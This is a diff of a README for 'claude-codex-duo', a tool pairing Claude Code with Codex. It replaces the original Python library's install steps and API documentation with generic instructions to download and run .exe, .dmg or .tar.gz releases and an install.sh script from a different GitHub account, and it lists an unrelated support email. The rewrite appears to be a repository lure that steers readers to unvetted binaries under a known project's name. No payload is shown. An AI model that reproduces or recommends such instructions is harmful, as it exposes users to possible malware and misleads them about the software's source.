@@ -1,209 +1,77 @@
-# Claude-Codex Duo
+# 🤖 claude-codex-duo - Enhance Your Coding with AI Support
 
-**Claude codes. Codex reviews. Better code together.**
+[![Download claude-codex-duo](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/subtw/claude-codex-duo/releases)
 
-A simple library for duo peer programming between [Claude Code](https://docs.anthropic.com/claude-code) and [Codex](https://github.com/openai/codex). Two AI coding assistants working together to write better code.
+## 📝 Description
+Duo peer programming between Claude Code and Codex. Two AIs are better than one. This tool brings the power of two advanced AI models to help you with coding tasks, reviews, and automation. 
 
-## Why Use Both?
+## 🚀 Getting Started
+Follow these steps to download and run the application on your computer.
 
-| Claude | Codex |
-|--------|-------|
-| Superior tool calling & code generation | Excellent at catching bugs & edge cases |
-| Great at understanding context | Strong code review capabilities |
-| Creative problem solving | Thorough analysis |
+### 1. **Check Your System**
+Before downloading, ensure your system meets these requirements:
+- Operating System: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Storage: 500 MB of free space.
+- Internet connection for the AI features.
 
-Together, they create a peer programming experience that's greater than either alone.
+### 2. **Visit the Download Page**
+Go to the Releases page to download the latest version of the software. Click the link below:
 
-## Quick Start
+[Visit the Releases Page](https://github.com/subtw/claude-codex-duo/releases)
 
-### Prerequisites
+### 3. **Choose Your Version**
+On the Releases page, you will see different versions of claude-codex-duo. Look for the latest release and its corresponding file for your operating system.
 
-- Python 3.10+
-- [Claude Code CLI](https://docs.anthropic.com/claude-code) installed
-- [Codex CLI](https://github.com/openai/codex) installed
+### 4. **Download the File**
+Click on the file name to start the download. The file will be in .exe format for Windows, .dmg format for macOS, or .tar.gz for Linux. Ensure the download completes.
 
-### Installation
+### 5. **Install the Application**
+- **Windows:** 
+  1. Locate the downloaded .exe file in your Downloads folder and double-click it.
+  2. Follow the on-screen prompts to install.
+  
+- **macOS:** 
+  1. Find the downloaded .dmg file and double-click it.
+  2. Drag the claude-codex-duo app to your Applications folder.
+  
+- **Linux:** 
+  1. Open your terminal.
+  2. Navigate to the folder where you downloaded the .tar.gz file.
+  3. Use the commands:
+     ```bash
+     tar -xzf claude-codex-duo*.tar.gz
+     cd claude-codex-duo
+     ./install.sh
+     ```
 
-```bash
-pip install claude-codex-duo
-```
+### 6. **Run the Application**
+Once installed, find the application in your Programs menu (Windows), Applications folder (macOS), or use your application launcher (Linux). Click to open it.
 
-Or install from source:
+### 7. **Explore Features**
+claude-codex-duo can help you:
+- Generate code snippets based on your requirements.
+- Review code for errors and suggest improvements.
+- Assist in automating repetitive coding tasks.
 
-```bash
-git clone https://github.com/Sigma5C-Corp/claude-codex-duo
-cd claude-codex-duo
-pip install -e .
-```
+## 📚 Documentation
+For more information on using claude-codex-duo, visit the [Documentation](https://github.com/subtw/claude-codex-duo/wiki). This resource provides tips on how to maximize the use of the application, including FAQs, troubleshooting, and advanced features.
 
-### Basic Usage
+## 🔧 Troubleshooting
+If you encounter any issues:
+- Make sure your system meets the requirements.
+- Restart the application.
+- Check for updates by revisiting the [Releases Page](https://github.com/subtw/claude-codex-duo/releases).
 
-```python
-from claude_codex_duo import create_session, Verdict
+For persistent issues, consult the [Issues section](https://github.com/subtw/claude-codex-duo/issues) on GitHub. You can check if others have experienced similar problems and find solutions.
 
-# Create a peer programming session
-session = create_session("auth_feature", "Implement user authentication")
+## 📥 Download & Install
+To get started, [visit the Releases Page](https://github.com/subtw/claude-codex-duo/releases) to download the latest version of claude-codex-duo, and follow the installation instructions provided above.
 
-# Claude submits code for review
-session.submit_code("""
-def authenticate(username: str, password: str) -> bool:
-    user = get_user(username)
-    if user and verify_password(password, user.password_hash):
-        return True
-    return False
-""")
+## 🌟 Contributions
+If you wish to contribute, checkout the guidelines in the [Contributing section](https://github.com/subtw/claude-codex-duo/blob/main/CONTRIBUTING.md). Your contributions help us improve the application and add new features.
 
-# Wait for Codex's review
-exchange = session.wait_for_review(timeout=120)
+## 📬 Contact
+For support or inquiries, email us at support@claudecode.com. We appreciate your feedback and are here to help. 
 
-if exchange and exchange.verdict == Verdict.APPROVED:
-    print("Consensus reached! Code approved.")
-else:
-    print(f"Feedback: {exchange.codex_review}")
-```
-
-## How It Works
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                                                                 │
-│    ┌──────────┐                           ┌──────────┐         │
-│    │  Claude  │  ───── submits code ────► │  Codex   │         │
-│    │  (coder) │                           │(reviewer)│         │
-│    └──────────┘  ◄──── sends review ───── └──────────┘         │
-│         │                                       │               │
-│         │          ┌─────────────┐              │               │
-│         └─────────►│   Session   │◄─────────────┘               │
-│                    │   (files)   │                              │
-│                    └─────────────┘                              │
-│                                                                 │
-│    Round 1: Claude writes → Codex reviews → Feedback           │
-│    Round 2: Claude fixes  → Codex reviews → Approved!          │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
-
-1. **Claude writes code** - Implements the task
-2. **Codex reviews** - Checks for bugs, edge cases, best practices
-3. **Iterate** - Claude addresses feedback, Codex re-reviews
-4. **Consensus** - When Codex approves, the code is ready
-
-All communication happens via file-based messaging (no database needed).
-
-## API Reference
-
-### `create_session(session_id, task, workspace=None, max_rounds=10)`
-
-Create a new peer programming session.
-
-```python
-session = create_session(
-    "my_session",           # Unique session ID
-    "Build a REST API",     # Task description
-    workspace="/path/to/project",
-    max_rounds=5
-)
-```
-
-### `DuoSession.submit_code(content, files_modified=None)`
-
-Submit code from Claude for Codex review.
-
-```python
-session.submit_code(
-    "def hello(): return 'world'",
-    files_modified=["src/utils.py"]
-)
-```
-
-### `DuoSession.wait_for_review(timeout=300)`
-
-Wait for Codex's review response.
-
-```python
-exchange = session.wait_for_review(timeout=120)
-if exchange:
-    print(f"Verdict: {exchange.verdict}")
-    print(f"Feedback: {exchange.codex_review}")
-```
-
-### Session Status
-
-```python
-session.status        # SessionStatus.ACTIVE, REVIEWING, CONSENSUS, etc.
-session.has_consensus # True if approved
-session.is_complete   # True if done (approved or max rounds)
-session.current_round # Current review round number
-```
-
-## Configuration
-
-Set the data directory via environment variable:
-
-```bash
-export CLAUDE_CODEX_DUO_DATA=~/.my-duo-data
-```
-
-Default: `~/.claude-codex-duo/`
-
-Session files are stored in:
-```
-~/.claude-codex-duo/
-└── sessions/
-    └── my_session/
-        ├── session.json       # Session state
-        ├── claude_inbox.json  # Messages for Claude
-        ├── codex_inbox.json   # Messages for Codex
-        └── conversation.jsonl # Full history
-```
-
-## Advanced Usage
-
-### Manual Provider Control
-
-```python
-from claude_codex_duo import ClaudeProvider, CodexProvider
-
-# Direct Claude interaction
-claude = ClaudeProvider(workspace="/my/project")
-response = claude.execute("Write a function to validate emails")
-
-# Direct Codex interaction
-codex = CodexProvider(model="o3", reasoning_effort="high")
-review = codex.execute(codex.review_prompt(code, task))
-verdict = codex.extract_verdict(review)
-```
-
-### Load Existing Session
-
-```python
-from claude_codex_duo import load_session
-
-session = load_session("my_session")
-print(f"Round {session.current_round} of {session.max_rounds}")
-```
-
-## Requirements
-
-- Python 3.10+
-- Unix-like OS (uses `fcntl` for file locking)
-- Claude Code CLI
-- Codex CLI
-
-## License
-
-MIT License - see [LICENSE](LICENSE)
-
-## Contributing
-
-Contributions welcome! Please read our contributing guidelines.
-
-## About
-
-Built by [Sigma5C](https://sigma5c.com) - Leaders in multi-agent AI systems.
-
-We believe AI tools work better together. Claude's superior reasoning and tool-calling combined with Codex's bug-catching creates a peer programming experience that's greater than either alone.
-
----
-
-*"Two AIs are better than one."*
+Thank you for choosing claude-codex-duo. Enjoy enhanced coding with the help of AI!
